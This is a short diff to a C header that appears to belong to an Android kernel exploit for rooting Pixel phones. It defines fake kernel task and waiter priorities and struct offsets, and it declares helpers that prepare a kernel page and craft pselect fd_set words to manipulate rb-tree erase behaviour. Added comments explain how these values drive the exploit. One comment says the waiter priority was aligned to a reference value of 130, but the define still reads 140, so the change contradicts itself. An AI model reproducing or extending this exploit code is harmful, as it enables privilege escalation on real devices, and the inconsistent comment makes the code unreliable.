@@ -65,6 +65,12 @@ extern int g_core_consumer;
 #define SKB_FRAG_BIAS 0
 
 #define FAKE_TASK_PRIO 120
+/* Waiter priority used for both the rb-tree ordering and the fd_set word
+ * that carries it. The reference implementation
+ * (Root-My-Pixel-Payloads src/common.h) uses 130; this build used 140.
+ * Both are > 120, which is what gates the erase, but the value also becomes
+ * the fd_set bitmap word, so it changes which fds are "ready" and how the
+ * consumer's pselect behaves. Aligned to the reference value. */
 #define FAKE_WAITER_PRIO 140
 #define FAKE_TASK_UCLAMP_REQ_OFF 0x350
 #define FAKE_TASK_UCLAMP_OFF 0x358
@@ -196,6 +202,9 @@ uintptr_t prepare_good_kernel_page(void);
 void fdset_put_word(fd_set *set, int word, uint64_t value);
 uint64_t fdset_get_word(const fd_set *set, int word);
 int tcp_route_selected(void);
+/* True when the active kernel is android12-5.10 (compact waiter without
+ * wake_state/ww_ctx). */
+int is_5_10_waiter(void);
 void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
